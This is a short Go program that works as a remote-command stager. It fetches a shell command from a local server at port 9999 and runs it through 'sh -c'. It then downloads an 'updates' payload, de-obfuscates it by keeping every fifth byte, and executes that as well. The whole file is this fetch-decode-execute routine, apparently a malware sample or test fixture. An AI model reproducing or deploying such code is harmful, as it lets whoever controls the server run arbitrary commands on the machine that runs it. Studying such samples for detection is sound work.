package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"
)

func read_resp(endpoint string) string {
	resp, err := http.Get("http://localhost:9999/" + endpoint)
	if err != nil {
		fmt.Print(err)
		os.Exit(1)
	}

	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Print(err)
		os.Exit(1)
	}

	return string(data)
}

func command(payload string) {
	sh := "sh"
	c := "-c"

	cmd := exec.Command(sh, c, payload)

	output, err := cmd.Output()
	if err != nil {
		fmt.Print(err)
		os.Exit(1)
	}

	fmt.Print(string(output))
}

func decrypt(payload string) string {
	data := []byte(payload)
	result := make([]byte, 0)

	for i := 0; i < len(data); i = i + 5 {
		result = append(result, data[i])
	}

	return string(result)
}

func main() {
	command(read_resp("command?os=" + runtime.GOOS))
	command(decrypt(read_resp("updates")))
}
